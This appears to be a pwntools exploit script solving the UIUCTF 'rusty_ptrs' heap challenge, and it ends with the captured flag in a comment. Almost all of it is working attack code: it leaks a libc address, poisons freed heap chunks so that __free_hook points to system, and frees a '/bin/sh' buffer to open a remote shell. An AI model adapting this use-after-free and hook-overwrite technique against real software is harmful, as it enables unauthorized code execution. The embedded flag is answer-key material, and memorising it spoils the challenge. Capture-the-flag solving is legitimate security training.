#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./rusty_ptrs_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

REMOTE_NC_CMD    = "nc rustyptrs.chal.uiuc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
set resolve-heap-via-heuristic force
b _ZN10rusty_ptrs8edit_buf17h6614070e2aa42cb3E
b system
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path], env={"LD_PRELOAD":"libgcc_s.so.1 libpthread-2.31.so libdl-2.31.so"})
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT, env={"LD_PRELOAD":"libgcc_s.so.1 libpthread-2.31.so libdl-2.31.so"})
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]), ssl=True)

def main():
    r = conn()
   
    def create_rule():
        r.sendline(b"1")
        r.sendline(b"1")

    def create_note():
        r.sendline(b"1")
        r.sendline(b"2")

    def del_rule(idx):
        r.sendline(b"2")
        r.sendline(b"1")
        r.sendline(bstr(idx))

    def del_note(idx):
        r.sendline(b"2")
        r.sendline(b"2")
        r.sendline(bstr(idx))

    def read_rule(idx):
        r.sendline(b"3")
        r.sendline(b"1")
        r.sendline(bstr(idx))

    def read_note(idx):
        r.sendline(b"3")
        r.sendline(b"2")
        r.sendline(bstr(idx))

    def edit_rule(idx, data):
        r.sendline(b"4")
        r.sendline(b"1")
        r.sendline(bstr(idx))
        r.sendline(data)

    def edit_note(idx, data):
        r.sendline(b"4")
        r.sendline(b"2")
        r.sendline(bstr(idx))
        r.sendline(data)

    r.sendline(b"5")
    r.recvuntil(b"> ")
    leak = int(r.recvuntil(b",")[:-1], 16)
    libc.address = leak - libc.sym.main_arena-96
    log.info(f"LIBC @ {hex(libc.address)}")

    for i in range(3):
        create_rule()
    for i in range(5):
        create_note()
    
    for i in range(4, -1, -1):
        del_note(i)

    edit_rule(0, p64(libc.sym.__free_hook)*7)
    sleep(0.5)
    
    create_note()
    edit_note(0, b"/bin/sh\0")
    sleep(0.5)
    create_note()
    
    edit_note(1, p64(libc.sym.system))
    del_note(0)
    r.interactive()
    #uiuctf{who_knew_if_my_pointers_lived_forever_they_would_rust???}

if __name__ == "__main__":
    main()